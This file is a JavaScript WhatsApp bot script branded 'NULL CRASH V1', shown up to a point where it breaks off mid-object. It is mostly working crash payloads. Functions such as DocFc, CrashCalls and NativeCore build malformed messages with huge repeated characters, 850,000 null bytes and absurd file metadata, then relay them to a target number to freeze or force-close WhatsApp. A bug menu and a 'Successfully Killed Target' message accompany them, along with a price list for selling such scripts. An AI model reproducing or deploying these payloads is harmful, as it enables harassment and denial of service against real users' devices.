
require('./setting')
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const axios = require('axios');
const fs = require('fs-extra')
const crypto = require("crypto")
const util = require('util')
const chalk = require('chalk')
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
//===============
module.exports = nato = async (nato, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = args.join(" "); 
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = await nato.decodeJid(nato.user.id);
const premuser = JSON.parse(fs.readFileSync("./system/database/premium.json"));
const sender = m.sender;
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!nato.public && !isCreator) return;
//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await nato.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const senderbot = m.key.fromMe ? nato.user.id.split(':')[0] + "@s.whatsapp.net" || nato.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
let example = (teks) => {
return `\n\`ᴡʀᴏɴɢ ᴄᴏᴍᴍᴀɴᴅ\` \n *ᴇxᴀᴍᴘʟᴇ ᴏғ ᴜsᴀɢᴇ* :*\nᴛʏᴘᴇ *cmd*${cmd}* ${teks}\n`
}
//================================
//              𝗤𝗨𝗢𝗧𝗘𝗗
//================================
const thumbnailUrl2 = 'https://files.catbox.moe/mks77q.jpg'
const thumbnailUrl = 'https://files.catbox.moe/mks77q.jpg'

const jpegThumbnail = fs.readFileSync('./media/thumb.jpg');

const fkatalog = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    id: "Katalog"
  },
  message: {
    productMessage: {
      product: {
        productImage: {
          mimetype: "image/jpeg",
          jpegThumbnail: jpegThumbnail
        },
        title: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1",
        description: `IDR: 999999\nυρтιмє: ${runtime(process.uptime())}\n\nWhatsApp Business - Verified Account`,
        currencyCode: "IDR",
        priceAmount1000: 999999000,
        productImageCount: 1
      },
      businessOwnerJid: "123456789@whatsapp.net"
    }
  }
};

    

    // Perbaikan objek bayzoffc
    const from = m.key.remoteJid || "";
const bayzoffc = {
  key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false
  },
  "message": {
    "orderMessage": {
      "orderId": "594071395007984",
      "itemCount": 12345678,
      "status": "INQUIRY",
      "surface": "CATALOG",
      "message": `ᴄᴏᴍᴍᴀɴᴅ: ${prefix + command}`,
      "orderTitle": "Kontol",
      "sellerJid": "242040158758@s.whatsapp.net",
      "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
      "totalAmount1000": "500000000000",
      "totalCurrencyCode": "IDR"
    }
  }
}
    
// ================= (  Tempat Function )=====================    
async function DocFc(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1" + "ꦾ".repeat(4500),
listType: 2,
singleSelectReply: {
    selectedRowId: "🔪"
},
contextInfo: {
stanzaId: nato.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "Wanna Die ? Huh !"
                    },
                    contentText: "I Wanna Die With You \"😮‍💨\"",
                    footerText: "© T-Яyuichi",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "⩟⬦𪲁 𝐓͜͢𝐀͠𝐌̋͡𝐀̸̷̷̷͡𝐗͜͢𝐒 -"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: ryclol,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "wangcap",
entryPointConversionApp: "wangcap",
actionLink: {
url: "t.me/tamainfinity",
buttonTitle: "trash"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: isTarget,
initiatedByMe:true
},
groupSubject: "crash",
parentGroupJid: "combine",
trustBannerType: "unexpected",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "𑲭𑲭 T-Riyu ~ \"ryc\" ⚔️ ",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© T-Яyuichi",
thumbnail: ryclol,
sourceUrl: "se me?",
sourceId: "ryc ~ broken",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "burst",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "trash"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363321780343299@newsletter",
serverMessageId: 1,
newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "crash"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "INITIATED_BY_USER"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await nato.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
console.log("Success! Force Ui Sent")
}


async function CrashCalls(target) {
var CallPermission = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo: {
mentionedJid: [m.chat],
isForwarded: true,
forwardingScore: 999
},
body: {
text: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1" + "ꦾ".repeat(9999),
footer: "T-Яyuichi"
},
nativeFlowMessage: {
buttons: [
{ 
name: "single_select", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "mpm", 
buttonParamsJson: "" 
}
]
}
}
}
}
};
await nato.relayMessage(target, CallPermission, { participant: { jid: target } });
}


async function NativeCore(target) {
  let NativeCore = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
          },
          body: {
            title: "👑",
            text: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1" + "᭄".repeat(9741),
            description: "💌",
            footer: "Minato",
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "" },
              { name: "view_product", buttonParamsJson: "" },
              { name: "payment_method", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" },
              { name: "mpm", buttonParamsJson: "" },
              { name: "payment_info", buttonParamsJson: "" },
            ],
          },
        },
      },
    },
  };
  await nato.relayMessage(target, NativeCore, {
    participant: { jid: target },
  });
  console.log("Successfully Send  To Target🎯")
}


// ------------------------------------------ [ InVisible Lag ] ------------------------------------------

// ================= ( Bates Function )=====================
const reply = (teks) => nato.sendMessage(m.chat, { text: teks }, { quoted: bayzoffc });
async function doneress () {
  if (!text) throw "Done Response"
  let pepec = args[0].replace(/[^0-9]/g, "")
  let thumbnailUrl = "https://files.catbox.moe/mks77q.jpg"
  let ressdone = `
╭──────────────❍
│ ─( 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑲𝒊𝒍𝒍𝒆𝒅 𝑻𝒂𝒓𝒈𝒆𝒕 )─
│
│⪼ 𝑇𝑦𝑝𝑒 𝐵𝑢𝑔 : *${command}*
│⪼ 𝑇𝑎𝑟𝑔𝑒𝑡 : *${pepec}*
╰──────────────❍

 𝑷𝒍𝒆𝒂𝒔𝒆 𝑷𝒂𝒖𝒔𝒆 𝟏𝟎 𝑴𝒊𝒏𝒖𝒕𝒆𝒔
` 
  
  nato.sendMessage(m.chat, {
    video: {
      url: 'https://files.catbox.moe/k8cy1u.mp4' 
    },
    caption: ressdone,
    gifPlayback: false,
    contextInfo: {
      mentionedJid: [m.sender],
      externalAdReply: {
        showAdAttribution: false,
        title: 'N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1',
        body: 'ᴄᴏᴅᴇʙʀᴇᴀᴋᴇʀ',
        thumbnailUrl: 'https://files.catbox.moe/mks77q.jpg',
        sourceUrl: 'https://whatsapp.com/channel/0029VbBIwwK4tRrr0GWdPZ46',
        mediaType: 2, 
        renderLargerThumbnail: false
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: '120363423407628679@newsletter',
        newsletterName: 'ᴄᴏᴅᴇʙʀᴇᴀᴋᴇʀ',
        serverMessageId: -1
      }
    },
    headerType: 5, 
    viewOnce: false
  }, { quoted: bayzoffc });
}
//======================
/*if (m.message) {
nato.readMessages([m.key]);*/
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold(" MASSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Sender:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 In:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 message :")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")
//======================
switch (command) {
// ================= ( Case Public )=====================
case 'public': {
  if (!isCreator) return m.reply(mess.owner);
  if (nato.public === true) return m.reply("𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚");

  nato.public = true;

  await nato.sendMessage(m.chat, {
    text: "SUCCESS PUBLIC BOT 🔓!",
    contextInfo: {
      externalAdReply: {
        title: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1",
        body: "null",
        mediaType: 1,
        thumbnailUrl: "https://files.catbox.moe/mks77q.jpg",
        sourceUrl: null,
      }
    },
    buttons: [
      {
        buttonId: ".self",
        buttonText: { displayText: "🔒 Self" },
        type: 1
      },
      {
        buttonId: ".menu",
        buttonText: { displayText: "𝐁𝐀𝐂𝐊" },
        type: 1
      }
    ],
    footer: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1"
  }, { quoted: bayzoffc });
}
break;
// ================= ( Case Self )=====================
case 'self': {
  if (!isCreator) return m.reply(mess.owner);
  if (nato.public === false) return m.reply("𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚");

  nato.public = false;

  await nato.sendMessage(m.chat, {
    text: "SUCCESS SELF BOT 🔒!",
    contextInfo: {
      externalAdReply: {
        title: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1",
        body: "null",
        mediaType: 1,
        thumbnailUrl: "https://files.catbox.moe/mks77q.jpg",
        sourceUrl: null,
      }
    },
    buttons: [
      {
        buttonId: ".public",
        buttonText: { displayText: "🔓 Public" },
        type: 1
      },
      {
        buttonId: ".menu",
        buttonText: { displayText: "Menu" },
        type: 1
      }
    ],
    footer: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1"
  }, { quoted: bayzoffc });
}
break;
// ================= ( Case Owner )=====================

// ================= ( Case Thanks Too )=====================
case "tqto": {

  const teksTqto = `
-

    𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎            
╠══════════════╣
║ 𝐋𝐎𝐑𝐃 𝐌𝐈𝐍𝐀𝐓𝐎 𝐃𝐄𝐕               
║ 𝐋𝐎𝐑𝐃 𝐎𝐁𝐈𝐓𝐎 𝐃𝐄𝐕               
║ 𝐃𝐒 𝐏𝐑𝐈𝐌𝐈𝐒                      
║ 𝐃𝐄𝐕 𝐀𝐒𝐊 𝐀𝐑𝐂𝐀𝐍𝐄                
║ 𝐈𝐍𝐂𝐎𝐍𝐍𝐔 𝐁𝐎𝐘                           
║ 𝐁𝐒𝐇 𝐃𝐄𝐕                         
║ 𝐌𝐑 𝐏𝐑𝐎𝐁𝐋𝐄𝐌𝐀𝐓𝐈𝐐𝐔𝐄             
║ 𝐒𝐏𝐀𝐂𝐄𝐗 𝐃𝐄𝐕                    
║ 𝐒𝐄𝐂𝐊 𝐉𝐑                         
║ 𝐘𝐎𝐒𝐇𝐈 𝐃𝐄𝐕                      
║ 𝐒𝐓𝐄𝐏𝐇 𝐃𝐄𝐕                      
║ 𝐙𝐄𝐏𝐇𝐘𝐑                          
║ 𝐃𝐄𝐍𝐊𝐈                             
║ 𝐒𝐀𝐍 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋                  
║ 𝐀𝐋𝐋 𝐌𝐘 𝐏𝐀𝐑𝐓𝐄𝐍𝐄𝐑𝐒             
╚═╣
`;

  await nato.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/mks77q.jpg' }, 
    caption: teksTqto.trim(),
    footer: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1",
    buttons: [
      { buttonId: ".menu", buttonText: { displayText: "𝐁𝐀𝐂𝐊" }, type: 1 }
    ],
    contextInfo: {
      externalAdReply: {
        title: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1",
        body: "𝐋𝐎𝐑𝐃 𝐌𝐈𝐍𝐀𝐓𝐎 𝐃𝐄𝐕",
        mediaType: 1,
        thumbnailUrl: "https://files.catbox.moe/mks77q.jpg",
        sourceUrl: null,
      }
    },
    headerType: 4
  }, { quoted: bayzoffc });
}
break;
// ================= ( Case Menu )=====================
case "menu": {
  await nato.sendMessage(from, { react: { text: "😈", key: m.key } });
  
  let caption = `
╔═══ ✦ ═════════╗
  ʜᴏᴋᴀɢᴇ ᴄʀᴀꜱʜ ᴠ𝟒
╠══ ✦ ══════════╣
    ᴄᴏᴅᴇʙʀᴇᴀᴋᴇʀ
╠══ ✦ ══════════╣
    ᴠᴇʀꜱɪᴏɴ 𝟒.𝟎.𝟎
╠══ ✦ ══════════╣
   ᴅᴀʀᴋ ᴄᴏᴅᴇ ᴇɴɢᴀɢᴇᴅ
╚══ ✦ ══════════╝
`;

  const buttonMessage = {
    image: { url: 'https://files.catbox.moe/omewf3.jpg' },
    caption: caption,
    footer: 'N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1',
    buttons: [
      { buttonId: ".bugmenu", buttonText: { displayText: '☍ 𝗕𝘂𝗴 𝗠𝗲𝗻𝘼' }, type: 1 },
      { buttonId: ".ownermenu", buttonText: { displayText: '☍ 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂' }, type: 1 },
      { buttonId: ".toolsmenu", buttonText: { displayText: '☍ 𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂' }, type: 1 },
      { buttonId: ".infosc", buttonText: { displayText: '☍ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗳𝗼' }, type: 1 }
    ],
    headerType: 1,
    viewOnce: true,
    contextInfo: {
      externalAdReply: {
        title: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1",
        body: "𝐋𝐎𝐑𝐃 𝐌𝐈𝐍𝐀𝐓𝐎 𝐃𝐄𝐕",
        thumbnailUrl: "https://files.catbox.moe/omewf3.jpg",
        sourceUrl: null,
        mediaType: 1,
        mediaUrl: "",
        showAdAttribution: true,
        renderLargerThumbnail: false
      },
      isForwarded: true,
      forwardingScore: 104792
    }
  };

  return await nato.sendMessage(m.chat, buttonMessage, { quoted: bayzoffc });
}
break;

case "bugmenu": {
  await nato.sendMessage(m.chat, { react: { text: `👻`, key: m.key } });
  
  const bugMenuMessage = {
    image: { url: 'https://files.catbox.moe/3pzc2b.jpg' },
    caption: `*N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1 - 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔* 🐛\n\nSelect the type of bug you want to use:\n\n⚠️ *Warning:* Use responsibly!`,
    footer: '𝐃𝐄𝐕: 𝐋𝐎𝐑𝐃 𝐌𝐈𝐍𝐀𝐓𝐎',
    viewOnce: true,
    contextInfo: {
      externalAdReply: {
        title: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1 - 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", 
        body: "Select bug type",
        thumbnailUrl: "https://files.catbox.moe/3pzc2b.jpg",
        sourceUrl: null,
        mediaType: 1,
        mediaUrl: "",
        showAdAttribution: true,
        renderLargerThumbnail: false
      }
    },
    interactiveButtons: [
      {
        name: "single_select",
        buttonParamsJson: JSON.stringify({
          title: "𝗕𝘂𝗴 𝗧𝘆𝗽𝗲𝘀 𝗠𝗲𝗻𝘂",
          sections: [
            {
              title: "𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗕𝘂𝗴𝘀",
              highlight_label: "𝗖𝗛𝗔𝗧",
              rows: [
                { title: "⏱️ 𝗗𝗲𝗹𝗮𝘆 𝗕𝘂𝗴", description: "Send delay bug messages", id: ".delaybug" },
                { title: "⬜ 𝗕𝗹𝗮𝗻𝗸 𝗕𝘂𝗴", description: "Send blank bug messages", id: ".blankbug" },
                { title: "👻 𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲 𝗕𝘂𝗴", description: "Send invisible bug messages", id: ".invisbug" }
              ]
            },
            {
              title: "𝗦𝘆𝘀𝘁𝗲𝗺 𝗕𝘂𝗴𝘀",
              highlight_label: "𝗦𝗬𝗦𝗧𝗘𝗠",
              rows: [
                { title: "💥 𝗙𝗼𝗿𝗰𝗲𝗰𝗹𝗼𝘀𝗲 𝗕𝘂𝗴", description: "Force close WhatsApp", id: ".forceclosebug" },
                { title: "👥 𝗚𝗿𝗼𝘂𝗽 𝗕𝘂𝗴", description: "Create group bugs", id: ".buggroup" }
              ]
            },
            {
              title: "𝗶𝗢𝗦 𝗕𝘂𝗴𝘀",
              highlight_label: "",
              rows: [
                { title: "📱 𝗶𝗢𝗦 𝗕𝘂𝗴", description: "iOS specific bugs", id: ".iosbug" }
              ]
            },
            {
              title: "𝗘𝗺𝗼𝗷𝗶 𝗕𝘂𝗴𝘀",
              highlight_label: "𝗘𝗠𝗢𝗝𝗜",
              rows: [
                { title: "💀 𝗘𝗺𝗼𝗷𝗶 𝗕𝘂𝗴", description: "Send emoji bug messages", id: ".emojibug" }
              ]
            },
            {
              title: "𝗕𝗮𝗰𝗸 𝗧𝗼 𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂",
              rows: [
                { title: "🔙 𝗕𝗮𝗰𝗸", description: "Return to main menu", id: ".menu" }
              ]
            }
          ]
        })
      }
    ]
  };

  return await nato.sendMessage(m.chat, bugMenuMessage, { quoted: bayzoffc });
}
break;


// ================= ( Case Info Harga )=====================
case "infosc": {
  const teksTqto = `
╔══════════════════════════════╗
║    ༒ 𝐋𝐄𝐆𝐄𝐍𝐃𝐀𝐑𝐘 𝐒𝐂𝐑𝐈𝐏𝐓𝐒 𝐒𝐓𝐎𝐑𝐄 ༒    
╚══════════════════════════════╝

╭─ 🌟 𝐒𝐂𝐑𝐈𝐏𝐓 𝐂𝐀𝐓𝐄𝐆𝐎𝐑𝐈𝐄𝐒 ────╮
│
│ 📦 𝐁𝐀𝐒𝐈𝐂 𝐏𝐀𝐂𝐊 (𝐧𝐨-𝐮𝐩𝐝𝐚𝐭𝐞)
│   ➤ Price : $1 USD
│   ➤ Updates : Not included
│   ➤ Support : 7 days
│
│ 🚀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐏𝐀𝐂𝐊 (𝐟𝐫𝐞𝐞-𝐮𝐩𝐝𝐚𝐭𝐞)
│   ➤ Price : $3 USD
│   ➤ Updates : Free (1x)
│   ➤ Support : 30 days
│
│ ⚡ 𝐕𝐈𝐏 𝐏𝐀𝐂𝐊 (𝐮𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝)
│   ➤ Price : $5 USD
│   ➤ Updates : Unlimited
│   ➤ Support : 90 days
│   ➤ Bonus : Exclusive scripts
│
╰────────────────────╯

╭─ 💼 𝐄𝐗𝐂𝐋𝐔𝐒𝐈𝐕𝐄 𝐋𝐈𝐂𝐄𝐍𝐒𝐄𝐒 ──╮
│
│ 👑 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐋𝐈𝐂𝐄𝐍𝐒𝐄
│   ➤ Price : $5 USD
│   ➤ Resale rights
│   ➤ Technical support
│   ➤ Updates : 3 months
│
│ 🏆 𝐏𝐀𝐑𝐓𝐍𝐄𝐑 𝐋𝐈𝐂𝐄𝐍𝐒𝐄
│   ➤ Price : $7 USD
│   ➤ Commission : 20%
│   ➤ Custom dashboard
│   ➤ Updates : 6 months
│
│ 👨‍💼 𝐎𝐖𝐍𝐄𝐑 𝐋𝐈𝐂𝐄𝐍𝐒𝐄
│   ➤ Price : $10 USD
│   ➤ Complete source code
│   ➤ Editing rights
│   ➤ Updates : 1 year
│
│ 🛠️ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 𝐋𝐈𝐂𝐄𝐍𝐒𝐄
│   ➤ Price : $12 USD
│   ➤ Complete API access
│   ➤ Personalized training
│   ➤ Unlimited VIP support
│
╰────────────────────╯

╭─ 💰 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 ───╮
│
│ 📱 𝐌𝐎𝐁𝐈𝐋𝐄 𝐏𝐀𝐘𝐌𝐄𝐍𝐓𝐒
│   ├─ MTN Mobile Money (Congo)
│   ├─ Airtel Money (Africa)
│   ├─ Orange Money (International)
│
│ 🌐 𝐄𝐋𝐄𝐂𝐓𝐑𝐎𝐍𝐈𝐂 𝐏𝐀𝐘𝐌𝐄𝐍𝐓𝐒
│   ├─ Binance Pay (USDT/BTC)
│   ├─ PayPal (International)
│   ├─ Mini pay (Transfer)
╰──────────────────────╯

╭─ 🎁 𝐅𝐑𝐄𝐄 𝐁𝐎𝐍𝐔𝐒𝐄𝐒 ──────╮
│
│ ✅ Free installation
│ ✅ Personalized configuration
│ ✅ Complete documentation
│ ✅ Video tutorials
│ ✅ VIP Telegram group
│ ✅ Priority updates
│ ✅ 24/7 support (WhatsApp)
│
╰─────────────────────╯

╭─ 📋 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐒𝐂𝐑𝐈𝐏𝐓𝐒 ────╮
│
│ 🤖 𝐌𝐮𝐥𝐭𝐢-𝐟𝐮𝐧𝐜𝐭𝐢𝐨𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐁𝐨𝐭𝐬
│ ├─ Complete security bot
│ ├─ Entertainment bot (games)
│ ├─ Download bot (YouTube, etc.)
│ ├─ Advanced moderation bot
│ └─ Economy bot (bank, casino)
│
│ 📊 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭 𝐒𝐲𝐬𝐭𝐞𝐦𝐬
│ ├─ Automated sales system
│ ├─ Support ticket system
│ ├─ Referral system
│ ├─ Ranking/level system
│ └─ Admin dashboard
│
│ 🎮 𝐄𝐱𝐜𝐥𝐮𝐬𝐢𝐯𝐞 𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬
│ ├─ Intelligent anti-link
│ ├─ Automatic welcome message
│ ├─ Cloud backup system
│ ├─ Responsive web interface
│ └─ Multi-language (FR/EN)
│
╰────────────────────────╯

╭─ ⚡ 𝐏𝐔𝐑𝐂𝐇𝐀𝐒𝐄 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 ────╮
│
│ 1️⃣ Contact us on WhatsApp
│ 2️⃣ Choose your pack/license
│ 3️⃣ Select payment method
│ 4️⃣ Make the payment
│ 5️⃣ Receive script via email
│ 6️⃣ Installation & configuration
│ 7️⃣ Continuous support ensured
│
╰────────────────────────╯

╭─ 📞 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 ──────────────╮
│
│ 📱 WhatsApp : +242 04 015 8758
│ 📧 Email : legendary.scripts@proton.me
│ 📢 Telegram : @LegendaryScripts
│ 🌐 Website : legendary-scripts.com
│ 🕐 Availability : 24/7
│
╰──────────────────────────╯

⚠️ 𝐈𝐌𝐏𝐎𝐑𝐓𝐀𝐍𝐓 :
• All payments are final
• No refund after delivery
• Check features before purchase
• Technical support included per pack
• For legal use only

🔐 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄 :
• 100% functional scripts
• Clean & optimized code
• Enhanced security
• Regular updates
• Responsive professional support

🌟 𝐂𝐔𝐑𝐑𝐄𝐍𝐓 𝐏𝐑𝐎𝐌𝐎 :
Buy 2 scripts, get the 3rd at 50% OFF!
Special discount for loyal customers.
`;

  await nato.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/mks77q.jpg' }, 
    caption: teksTqto.trim(),
    footer: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1",
    buttons: [
      { buttonId: ".owner", buttonText: { displayText: "Chat Developer" }, type: 1 }
    ],
    contextInfo: {
      externalAdReply: {
